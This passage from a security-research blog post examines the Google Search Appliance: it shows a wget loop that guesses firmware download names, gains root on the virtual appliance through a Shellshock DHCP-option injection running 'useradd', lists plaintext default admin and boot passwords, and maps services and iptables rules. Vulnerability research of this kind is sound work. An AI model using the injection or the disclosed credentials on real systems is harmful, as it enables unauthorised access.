&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Next, found the link to the old version software from Google Groups:
https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The link was:&lt;/p&gt;

&lt;p&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin [removed]&lt;/p&gt;

&lt;p&gt;And we can obtain all version number from:
&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Guessing the File Naming Rules as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install_bundle-10000(3-digit numbers)-7.(numbers).(numbers)-(numbers).bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And write a shell script to attempt downloading software:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Including the information found through internet search, successfully retrieved the following file:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
all_langs-lang-pack-2.2-1.bin
centos_patch_files-6.0.0-22.bin
centos_patch_files-6.14.0-28.bin
centos_patch_files-7.0.14-238.bin
centos_patch_files-7.2.0-252.bin
centos_patch_files-7.2.0-264.bin
centos_patch_files-7.2.0-270.bin
centos_patch_files-7.2.0-280.bin
centos_patch_files-7.2.0-286.bin
install_bundle-10000653-7.2.0-252.bin
install_bundle-10000658-7.2.0-264.bin
install_bundle-10000661-7.2.0-270.bin
install_bundle-10000681-7.4.0-64.bin
install_bundle-10000685-7.4.0-72.bin
install_bundle-10000686-7.4.0-74.bin
install_bundle-10000692-7.4.0-82.bin
install_bundle-10000762-7.6.0-36.bin
install_bundle-10000767-7.6.0-42.bin
install_bundle-10000772-7.6.0-46.bin
install_bundle-10000781-7.6.0-58.bin
install_bundle-10000810-7.6.50-30.bin
install_bundle-10000822-7.6.50-36.bin
install_bundle-10000855-7.6.50-64.bin
install_bundle-10000878-7.6.250-12.bin
install_bundle-10000888-7.6.250-20.bin
install_bundle-10000901-7.6.250-26.bin
install_bundle-10000915-7.6.360-10.bin
install_bundle-10000926-7.6.360-16.bin
install_bundle-10000967-7.6.512-18.bin
sw_files-5.0.4-22.bin
sw_files-6.14.0-28.bin
sw_files-7.0.14-238.bin
vm_patch_1_for_504_G22_and_G24_only.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;

&lt;p&gt;Next, we began research on vGSA. By default, after importing the virtual machine, 
this system only provides a function for network configuration and doesn‚Äôt provide a system shell for operation or use.
However, because the virtual machine operates within ours own environment,
it is usually possible to obtain system permissions through the following methods:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Directly altering unencrypted disk files&lt;/li&gt;
  &lt;li&gt;Modifying the virtual machine memory&lt;/li&gt;
  &lt;li&gt;Booting using CDs or disks from another operating system&lt;/li&gt;
  &lt;li&gt;Exploiting known vulnerabilities&lt;/li&gt;
  &lt;li&gt;Utilizing hard-coded administrator or system account passwords&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following image shows the network configuration screen:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;

&lt;p&gt;When testing early Linux appliances and servers, especially those using the RedHat series operating system, 
there are often Shellshock vulnerabilities, and the 2008 released vGSA is no exception.
Inserting option 114 in the DHCP server will be set in the environment variable, 
thereby triggering the vulnerability and executing any command.&lt;/p&gt;

&lt;p&gt;The command attempted to be inserted is: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;. 
This command can be observed to be executed repeatedly, as error messages continue to appear in the console output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;vgsa-operation-system-observation&quot;&gt;vGSA operation system observation&lt;/h4&gt;

&lt;p&gt;After successfully obtaining operating system privileges,
we can observe the network environment, 
the running applications, and the file system.
Here are some insights gained from observing the operating system environment:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Version number is 5.2.0.G.27.&lt;/li&gt;
  &lt;li&gt;Services are mainly written in C/C++, Java, Python.&lt;/li&gt;
  &lt;li&gt;/export/hda3 seems to be the directory primarily used by the service.&lt;/li&gt;
  &lt;li&gt;/etc/shadow contains the root account with password hash x‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàM.&lt;/li&gt;
  &lt;li&gt;Administration interface listening on port 8000, 8443 with default admin password, j0njlRXpU5CQ.&lt;/li&gt;
  &lt;li&gt;/.gnupg contains ent_box_key public and private keys.&lt;/li&gt;
  &lt;li&gt;/.gnupg contains google_license_key public key.&lt;/li&gt;
  &lt;li&gt;/.ssh/authorized_keys contains two sets of public keys.&lt;/li&gt;
  &lt;li&gt;/root/.ssh/authorized_keys contains one set of public keys.&lt;/li&gt;
  &lt;li&gt;/root/.ssh/ contains two sets of SSH public and private keys.&lt;/li&gt;
  &lt;li&gt;/root/.gnupg/ contains ent_box_key public and private keys.&lt;/li&gt;
  &lt;li&gt;Oracle‚Äôs Outside In Technology is used to convert documents into HTML web pages.&lt;/li&gt;
  &lt;li&gt;The Java runtime environment uses a Security Manager for protection.&lt;/li&gt;
  &lt;li&gt;The request for engineer support function uses ppp to build a virtual private network, /etc/ppp/chap-secrets contains account passwords ( z‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàc„ÄÅ]‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàT  ).&lt;/li&gt;
  &lt;li&gt;The boot menu password in /etc/lilo.conf is cmBalx7.&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric has a string that seems to be used for symmetric encryption.&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd contains two sets of username-password combinations ( adminÔºö M‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàw=:9‚ñà‚ñà=  googleÔºöw‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñào=:N‚ñà‚ñà= ).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Executable programs with network services are as follows:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Listen Port&lt;/th&gt;
      &lt;th&gt;Process Name&lt;/th&gt;
      &lt;th&gt;Program Language&lt;/th&gt;
      &lt;th&gt;Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;OpenSSH Server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;953&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1111&lt;/td&gt;
      &lt;td&gt;webserver_config&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;Installer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2100&lt;/td&gt;
      &lt;td&gt;adminrunner.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;admin console backend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3990&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;admin console frontend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4911&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4916&lt;/td&gt;
      &lt;td&gt;reactor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5600&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6600&lt;/td&gt;
      &lt;td&gt;cacheserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;admin console frontend (http)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7880&lt;/td&gt;
      &lt;td&gt;TableServer&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7882&lt;/td&gt;
      &lt;td&gt;AuthzChecker&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7886&lt;/td&gt;
      &lt;td&gt;tomcat&lt;/td&gt;
      &lt;td&gt;Java&lt;/td&gt;
      &lt;td&gt;tomcat server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;redirect http to https&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8888&lt;/td&gt;
      &lt;td&gt;GWS&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9300&lt;/td&gt;
      &lt;td&gt;oneboxserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9328&lt;/td&gt;
      &lt;td&gt;entspellmixer&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9400&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9402&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9448&lt;/td&gt;
      &lt;td&gt;qrewrite&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9450&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager )&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10094&lt;/td&gt;
      &lt;td&gt;enterprise_onebox&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10200&lt;/td&gt;
      &lt;td&gt;clustering_server&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11913&lt;/td&gt;
      &lt;td&gt;sessionmanager&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12345&lt;/td&gt;
      &lt;td&gt;RegistryServer&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19780&lt;/td&gt;
      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;extract, transform and feed records&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;21200&lt;/td&gt;
      &lt;td&gt;FileSystemGateway&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;31300&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Despite the presence of so many services, most connections are blocked by iptables. 
The following are the iptables settings:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
